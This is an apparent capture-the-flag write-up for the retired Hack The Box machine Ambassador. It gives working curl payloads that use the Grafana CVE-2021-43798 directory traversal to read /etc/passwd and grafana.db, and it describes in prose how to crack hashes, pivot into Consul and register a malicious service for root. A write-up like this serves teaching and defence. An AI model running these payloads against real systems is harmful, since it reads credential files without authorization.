---
machine: Ambassador
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, grafana, cve-2021-43798, directory-traversal, consul, credentials]
---

# Ambassador — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Grafana 8.2.0 is vulnerable to CVE-2021-43798 and allows arbitrary file reads. `grafana.db` yields users and hashes; the credentials grant Consul access and escalation through a misconfigured service.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80,3000,8500 <IP>
```

Add `ambassador.htb` to hosts. Grafana runs on port 3000 and Consul on 8500.

## Initial access

Confirm Grafana 8.2.0 and exploit the plugin directory traversal:

```bash
curl --path-as-is 'http://<IP>:3000/public/plugins/alertlist/../../../../../../etc/passwd'
```

Download `grafana.db`:

```bash
curl --path-as-is 'http://<IP>:3000/public/plugins/alertlist/../../../../../../var/lib/grafana/grafana.db' -o grafana.db
```

Extract users and hashes with `sqlite3`. Crack the hash or reuse a password.

## Lateral movement

Use the credentials to access Consul. Enumerate services, nodes and KV keys; tokens or SSH credentials may be present.

## Privilege escalation

Find a Consul service or task running as root that accepts user configuration. Register a malicious service or modify a script to get a root shell.

## Evidence

- Grafana version and traversal response.
- `grafana.db` and redacted hash.
- Consul access.
- Modified service and root shell.

## Lessons learned

- Old Grafana leaks files outside the webroot.
- `grafana.db` holds users and secrets.
- Consul without ACLs exposes topology and configuration.
- Orchestration services may run as root.

## Mitigation and detection

- Update Grafana to a fixed version.
- Restrict port 3000 and enforce authentication.
- Protect `grafana.db` and rotate credentials.
- Configure Consul ACLs and review services.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2021-43798>
- <https://www.hackthebox.com/machines/ambassador>
- <https://developer.hashicorp.com/consul/docs/security/acl>
